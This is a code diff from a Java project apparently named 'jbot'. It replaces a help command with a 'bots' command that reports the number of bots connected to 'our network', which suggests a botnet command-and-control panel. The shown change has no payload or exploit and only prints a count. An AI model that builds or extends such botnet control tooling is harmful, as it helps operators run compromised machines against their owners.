@@ -8,16 +8,16 @@ import me.aaronakhtar.jbot.threads.handlers.ClientHandler;
 import java.io.BufferedReader;
 import java.io.BufferedWriter;
 
-public class HelpCommand implements JBotCommand {
+public class BotsCommand implements JBotCommand {
 
     @Override
     public String getCommand() {
-        return "help";
+        return "bots";
     }
 
     @Override
     public String getDescription() {
-        return "list all commands";
+        return "view total bots connected to our network.";
     }
 
     @Override
@@ -27,13 +27,7 @@ public class HelpCommand implements JBotCommand {
 
     @Override
     public void doAction(String[] args, ClientHandler client, BufferedWriter out, BufferedReader in) throws Exception {
-        out.write("\r\n" + Utilities.Colour.WHITE_BG.get() + Utilities.Colour.BLACK.get() + Main.name + " Commands"+ Utilities.Colour.RESET.get() +" ->"+"\r\n \r\n");
-        for (Class<? extends JBotCommand> commandClass : Main.commands) {
-            final JBotCommand command = commandClass.newInstance();
-            out.write(Utilities.Colour.YELLOW.get() + command.getCommand() + " - " + command.getDescription() + Utilities.Colour.NEW_LINE.get());
-        }
-        out.write("\r\n");
+        out.write(Utilities.Colour.YELLOW.get() + "Total Bots Connected: "+ Utilities.Colour.MAGENTA_BG.get() + Main.connectedBots.size() +"\r\n");
         out.flush();
-
     }
 }
